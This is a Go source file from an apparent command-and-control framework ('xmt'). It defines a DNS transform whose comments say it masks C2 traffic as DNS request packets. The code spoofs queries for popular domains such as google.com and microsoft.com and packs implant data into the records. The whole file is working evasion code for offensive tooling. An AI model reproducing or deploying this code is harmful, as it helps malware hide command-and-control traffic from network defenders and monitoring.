package transform

import (
	"errors"
	"io"
	"strings"
	"sync"

	"github.com/iDigitalFlame/xmt/xmt/data"
	"github.com/iDigitalFlame/xmt/xmt/util"
)

const (
	bufSize = 512

	dnsID uint8 = 0xE0

	dnsNameMax   = 64
	dnsRecordMax = 128
)

var (
	// DNS is the standard DNS Transform struct. This struct
	// uses the default DNS addresses contained in 'DefaultDNSNames' to
	// spoof DNS packets. Custom options may be used by creating a new DNS
	// struct or updating the 'Domains' property.
	DNS = &DNSClient{}

	// DefaultDNSNames is in array of DNS names to be used if the
	// 'Domains' property of a DNS struct is nil or empty.
	DefaultDNSNames = []string{
		"duckduckgo.com",
		"google.com",
		"microsoft.com",
		"amazon.com",
		"cnn.com",
		"youtube.com",
		"twitch.tv",
		"reddit.com",
		"facebook.com",
		"slack.com",
	}

	// ErrInvalidLength is an error raised by the Read and Write functions
	// if the byte array supplied is smaller than the required byte size to
	// Transform into a DNS packet.
	ErrInvalidLength = errors.New("length of byte array is invalid")

	bufs = &sync.Pool{
		New: func() interface{} {
			return make([]byte, bufSize)
		},
	}
)

// DNSClient is a Transform struct that attempts to mask C2 traffic
// in the form of DNS request packets.
type DNSClient struct {
	Domains []string

	lastA byte
	lastB byte
}

func (d *DNSClient) getName() string {
	if d.Domains == nil || len(d.Domains) == 0 {
		return DefaultDNSNames[util.Rand.Intn(len(DefaultDNSNames))]
	}
	if len(d.Domains) == 1 {
		return d.Domains[0]
	}
	return d.Domains[util.Rand.Intn(len(d.Domains))]
}

// Read satisfies the Transform interface requirements.
func (d *DNSClient) Read(w io.Writer, b []byte) error {
	if len(b) < 16 {
		return ErrInvalidLength
	}
	_ = b[16]
	d.lastA, d.lastB = b[0], b[1]
	c, i := uint16(b[11])|uint16(b[10])<<8, uint16(b[5])|uint16(b[4])<<8
	if c == 0 || i == 0 {
		return io.EOF
	}
	x, v := 12, 0
	for ; i >= 0 && x < len(b); i-- {
		if v = int(b[x]); v == 0 {
			break
		}
		x += v + 1
	}
	x += 15
	for ; c >= 0 && x < len(b); c-- {
		if v = int(b[x]); v == 0 {
			break
		}
		if _, err := w.Write(b[x+1 : x+v+1]); err != nil {
			return err
		}
		x += v + 1
	}
	return nil
}

// Write satisfies the Transform interface requirements.
func (d *DNSClient) Write(w io.Writer, b []byte) error {
	if b == nil || len(b) == 0 {
		return ErrInvalidLength
	}
	g := bufs.Get().([]byte)
	_ = g[bufSize-1]
	n := strings.Split(d.getName(), ".")
	c, i := (len(b)/dnsRecordMax)+1, len(n)
	if d.lastA != 0 && d.lastB != 0 {
		g[0], g[1] = d.lastA, d.lastB
		d.lastA, d.lastB = 0, 0
	} else {
		d.lastA, d.lastB = byte(util.Rand.Int()), byte(util.Rand.Int())
		g[0], g[1] = d.lastA, d.lastB
	}
	g[2], g[3] = 1, 32
	g[4], g[5] = byte(i>>8), byte(i)
	g[6], g[7], g[8], g[9] = 0, 0, 0, 0
	g[10], g[11] = byte(c>>8), byte(c)
	w.Write(g[:12])
	t, y := 0, 0
	for x := range n {
		t = copy(g[1:dnsNameMax], []byte(n[x]))
		g[0] = byte(t)
		w.Write(g[:t+1])
	}
	g[0], g[1], g[2], g[3], g[4] = 0, 0, 1, 0, 1
	g[5], g[6], g[7], g[8], g[9] = 0, 0, 42, 16, 0
	g[10], g[11], g[12], g[13], g[14] = 0, 0, 0, 0, 0
	w.Write(g[:15])
	for y < len(b) {
		if t = copy(g[1:dnsRecordMax], b[y:]); t == 0 {
			break
		}
		g[0] = byte(t)
		w.Write(g[:t+1])
		if t+1 < dnsRecordMax || t == 0 {
			break
		}
		y += t
	}
	bufs.Put(g)
	return nil
}

// MarshalStream attempts to write this DNS Transform to a stream.
func (d *DNSClient) MarshalStream(w data.Writer) error {
	if err := w.WriteUint8(dnsID); err != nil {
		return err
	}
	if err := data.WriteStringList(w, d.Domains); err != nil {
		return err
	}
	return nil
}

// UnmarshalStream attempts to read this DNS Transform from a stream.
func (d *DNSClient) UnmarshalStream(r data.Reader) error {
	if err := data.ReadStringList(r, &(d.Domains)); err != nil {
		return err
	}
	return nil
}
